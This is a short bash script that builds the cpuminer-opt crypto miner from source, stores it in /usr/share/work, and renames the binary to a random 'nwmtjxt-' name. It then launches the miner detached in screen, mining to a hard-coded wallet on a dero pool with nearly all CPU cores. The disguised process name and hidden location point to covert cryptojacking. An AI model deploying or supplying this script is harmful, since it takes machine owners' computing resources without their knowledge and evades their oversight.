#!/bin/bash
sudo apt-get update
sudo apt-get install cpulimit
sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim
echo "vm.nr_hugepages=128" >> /etc/sysctl.conf && sysctl -p
cpuminer=nwmtjxt;
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/$cpuminer
mkdir /usr/share/work/$cpuminer
git clone https://github.com/JayDDee/cpuminer-opt.git /usr/share/work/$cpuminer
a='nwmtjxt-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
cd /usr/share/work/$cpuminer
./build.sh || true
make install
mv cpuminer $cpuminer -n
sudo cp $cpuminer "$cpuname"
sudo rm -f  cpuminer
echo $cpuname" is starting"
cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo )
if [ $cpucores -ge 16 ]; then
downcore=2;
else 
downcore=1;
fi
if [ $cpucores -ge 2 ]; then
detectcpu=$[$cpucores - $downcore]
else 
detectcpu=$cpucores
fi
maxcore=$[$cpucores - $downcore];
screen -d -m ./"${cpuname}" -a lyra2z330 -o stratum+tls://dero.miner.rocks:5555 -i ZUu73HWZreesYQmWxeR6UJM2V2xrRNQc2J -p w=Rig1 -t $maxcore
